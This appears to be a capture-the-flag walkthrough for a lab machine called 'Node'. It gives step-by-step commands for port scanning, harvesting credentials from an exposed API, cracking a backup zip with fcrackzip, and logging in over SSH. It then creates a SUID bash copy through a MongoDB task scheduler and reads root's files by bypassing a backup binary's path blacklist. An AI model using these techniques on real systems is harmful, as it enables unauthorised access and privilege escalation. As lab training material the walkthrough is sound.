## Node

#### Scan to discover open ports
```sh
nmap -sS -P0 -n -p- -T5 -oA nmap-tcp-allports-fast 10.10.10.58
```

#### Enumerate the discovered ports
```sh
nmap -sV -n -sC -p22,3000 -oA nmap-tcp-foundports 10.10.10.58
```

Gobuster/dirbuster doesn't work as every response returns 200.

So fire up burp to intercept a request to `http://10.10.10.58:3000/`. Notice that there are 2 responses; one for `/` as expected but then another one for `/<uuid>`.

Navigate to the `/<uuid>` link from a browser through Burp. Go to the Target -> Site Map tabs and expand the 10.10.10.58 host. Notice the `/api/users/latest` file and you should see json content. If not then you can run:
```sh
$ curl -s http://10.10.10.58:3000/api/users | json_pp
```


Naviagate to the login page in a web browser at `http://10.10.10.58:3000/login`, enter the admin credentials discovered in `http://10.10.10.58:3000/api/users` and click the `Login` button.
Once you'ev logged in, click the `Download Backup` button that is presented to you and save the file as `myplace.backup.zip`.

#### Decode the content to reveal a zip file
```sh
$ base64 --decode myplace.backup > myplace.backup.zip
```

#### Crack the zip file
```sh
$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u myplace.backup.zip
```

#### Unzip the backup
```sh
$ unzip myplace.backup.zip
```

#### Review the app.js file
```sh
$ vim -R var/www/myspace/app.js
```

Notice the `const url` towards the top which contains a mongodb connection string including a username and password.

#### SSH into the Node box using the mongodb creds we just found
```sh
$ ssh 10.10.10.58 -l mark
```

#### Insert task into mongo-based task executor
```sh
# Connect to local mongo scheduler db
$ mongo -p -u mark scheduler

# Insert a new task to copy bash and SUID it
> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/lsec; /bin/chmod u+s /tmp/lsec; chmod g+s /tmp/lsec"});

# See if task is still pending
> db.tasks.find()

# Exit mongodb
> Ctrl-D
```

#### Execute the SUID bash shell using the -p flag
```sh
$ /tmp/lsec -p
```

#### Find SUID programs now that we're Tom
```sh
$ find / -perm -4000 2>/dev/null
```

#### Investigate the `/usr/local/bin/backup` found in output above
```sh
$ ls -ltr /usr/local/bin/backup

$ file /usr/local/bin/backup

$ /usr/local/bin/backup
```
The above commands don't reveal much and guessing at the usage of the command results in no output.

#### Search for references to the backup binary in app.js
```
node$ grep backup /var/www/myplace
```
The last line above reveals the usage of the backup command, which references a `backup_key` which can be found the first line of output above. What if we try to backup the /root dir?
```
# Run the backup tool against /root
node$ /usr/local/bin/backup -q <backup_key> /root

# Copy and paste the output into your attack machine
kali$ vim node-slash-root.b64

# Base64 decode it into a zip file
kali$ base64 --decode node-slash-root.b64 > node-slash-root.zip

# Unzip using 7z and provide password gleaned from fcrackzip above
kali$ 7z x node-slash-root.zip

# We can see there is a root.txt, so let's look at it
kali$ cat root.txt
```
Instead of a root flag we see ASCII art of a troll face. :( So it seems that /root is blacklisted. What if we cd to the `/` directory and try backing up `root` as a relative path?
```
# Move to the / directory
cd /

# Run the backup tool against root
node$ /usr/local/bin/backup -q <backup_key> root

# Copy and paste the output into your attack machine
kali$ vim node-relative-root.b64

# Base64 decode it into a zip file
kali$ base64 --decode node-relative-root.b64 > node-relative-root.zip

# Unzip using 7z and provide password gleaned from fcrackzip above
kali$ 7z x node-relative-root.zip

# We can see there is a root.txt, so let's look at it
kali$ cat root.txt
```
And now we can see the root flag! :)
